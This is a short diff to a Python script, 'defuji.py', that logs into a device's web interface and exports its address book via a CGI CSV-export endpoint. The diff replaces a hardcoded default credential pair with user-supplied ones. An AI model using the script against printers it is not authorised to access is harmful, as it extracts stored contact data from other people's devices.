@@ -5,13 +5,15 @@ import requests
 from csv import DictReader
 
 
-if len(sys.argv) == 2:
+if len(sys.argv) == 4:
 	target=sys.argv[1]
+	user=sys.argv[2]
+	password=sys.argv[3]
 	if (not(target.startswith("http"))):
 		target="http://"+target
 	URL=target+"/addr/cgi-bin/addrBKCSVExptProc.cgi?transFileName=SPLFILE&exportType=9"
 	c = requests.Session()
-	c.auth =('11111', 'x-admin')
+	c.auth =(user, password)
 	r = c.get(URL)
 	if (r.status_code==200):
 		csv_dict_reader = DictReader(r.text.split('\n')[1:])
@@ -24,5 +26,5 @@ if len(sys.argv) == 2:
 	else: print("Failed")
 else:       
 	print("Usage:")
-	print("defuji.py IP")
-	print("i.e.: defuji.py 192.168.1.100")
+	print("defuji.py IP user pass")
+	print("i.e.: defuji.py 192.168.1.100 printuser 123456")
